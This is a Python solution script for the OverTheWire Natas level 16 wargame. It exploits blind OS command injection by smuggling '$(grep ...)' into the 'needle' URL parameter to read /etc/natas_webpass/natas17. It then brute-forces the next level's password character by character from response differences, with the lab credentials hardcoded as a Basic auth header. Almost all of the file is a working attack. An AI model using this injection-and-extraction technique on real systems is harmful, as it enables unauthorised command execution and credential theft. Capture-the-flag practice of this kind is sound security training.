import requests
import re

#basic_auth = 'natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
url = 'http://natas16.natas.labs.overthewire.org'
header = { 'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

def connect():
    resp = requests.get(url, headers=header)
    if resp.status_code != requests.codes.ok:
        print('Can\'t connect')
    else:
        print("Connected!")

def discover_charset():
    discovered_charset = ''
    print("Attempting to discover charset for brute force attempt..")
    for char in chars:
        #requests hackers through grep, if char gets added onto it through discovery we found a valid character!
        r = requests.get(url + '/?needle=hackers$(grep ' + char + ' /etc/natas_webpass/natas17)', headers=header)
        #print(r.content)
        if "hackers".encode() not in  r.content:
            discovered_charset += char
            print(discovered_charset)
    print("Final charset is: " + discovered_charset)
    print("Length: " + str(len(discovered_charset)))
    print("maximum attempts to bruteforce 32 char key: " + str((len(discovered_charset) * 32)))
    print("maximum if full charset :" + str((len(chars) * 32)))
    print("Note: probability is based on being able to brute each character indivudally")
    return discovered_charset

def bruteforce(charset):
    password = ''
    print("Attempting bruteforce of password!")
    for i in range(32):
        for char in charset:
            r = requests.get(url + '/?needle=hackers$(grep  ^' + password + char + ' /etc/natas_webpass/natas17)', headers=header)
            if "hackers".encode() not in r.content:
                password += char
                print("Password: " + password + '*' * int(32 - len(password)))
    return password

connect()
d_charset = '035789bcdghkmnqrswAGHNPQSW'
bruteforce(d_charset)
#d_charset = discover_charset()